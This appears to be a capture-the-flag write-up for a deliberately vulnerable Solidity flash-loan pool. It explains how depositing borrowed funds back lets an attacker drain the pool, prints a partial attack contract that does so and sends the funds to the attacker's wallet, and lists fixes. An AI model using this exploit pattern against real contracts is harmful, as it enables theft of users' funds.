## Problems

```SideEntranceLenderPool``` have ```deposit()``` and ```withdraw``` function which allow to change the balance of contract. Something that must be consider here is the contract doesn't prevent an account to deposited the loan fund. 
```js
///SideEntranceLenderPool.sol

function deposit() external payable {
    balances[msg.sender] += msg.value;
}

function withdraw() external {
    uint256 amountToWithdraw = balances[msg.sender];
    balances[msg.sender] = 0;
    payable(msg.sender).sendValue(amountToWithdraw);
}
```
Because of these 2 function, we can ```withdraw()``` the entire fund on contract by simply deposit the loaned fund and make our balances increased then withdraw it. The transaction will not be reverted because this contract only check if balance after loan and before loan is same.
```js
require(address(this).balance >= balanceBefore, "Flash loan hasn't been paid back");
```

## How to Attack
we can simply attack the smart contract with contract that contain 2 function, one for call ```flashLoan()``` and one named ```execute()``` which have to call ```deposit``` in pool contract. The function can be like this:
```js
///SideEntranceAttack.sol
...

///function to begin attack 
function attack(uint256 _amount,address attacker) external {
    ///begin the attack with calling flashLoan
    pool.flashLoan(_amount);

    ///withdraw
    pool.withdraw();

    ///send the fund to attacker wallet
    (bool success,)=attacker.call{value:address(this).balance}("");
    require(success);
}

///function named execute() to called by pool contract
function execute() external payable {
    ///deposit to pool
    pool.deposit{value:address(this).balance}();
}

...
```
full attack contract can be checked <a href=../../contracts/attacker-contracts/side-entrance/SideEntranceAttack.sol>here</a>.

## Lesson and How to Prevent 

1. prevent user to Deposit the loaned fund, make a modifier.
2. it's a bad idea if a flash loan contract have another payable function than receive().
3. we can use WETH instead and force the loaner to send WETH in the end of flashLoan() function. 